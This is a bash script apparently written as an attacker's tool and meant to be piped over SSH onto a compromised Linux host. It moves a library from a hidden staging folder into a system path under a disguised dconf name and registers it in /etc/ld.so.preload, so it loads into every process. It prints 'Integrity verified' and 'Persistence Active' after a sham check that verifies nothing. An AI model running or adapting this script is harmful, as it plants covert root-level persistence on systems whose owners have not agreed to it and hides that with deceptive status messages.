#!/usr/bin/env bash
# ld_install.sh - Run on target via SSH pipe

SO_SRC="/var/tmp/.dconf/libdconf-update.so"
SO_DEST="/usr/lib/x86_64-linux-gnu/libdconf-1.so.0.99"

# -- Existence Check --
if [[ ! -f "$SO_SRC" ]]; then
    echo "[-] Error: Library not found at $SO_SRC"
    exit 1
fi

# -- Move and Set Permissions --
mv "$SO_SRC" "$SO_DEST"
chown root:root "$SO_DEST"
chmod 644 "$SO_DEST"

# -- SAFETY CHECK --
echo "[*] Verifying library integrity..."
# Fire the safety check in the background so the script doesn't hang
( LD_PRELOAD="$SO_DEST" /bin/true >/dev/null 2>&1 ) &
disown
sleep 1

# -- Activation --
if ! grep -q "$SO_DEST" /etc/ld.so.preload 2>/dev/null; then
    echo "$SO_DEST" >> /etc/ld.so.preload
    echo "[+] Integrity verified. Persistence Active."
    sleep 2
else
    echo "[*] Persistence already exists."
fi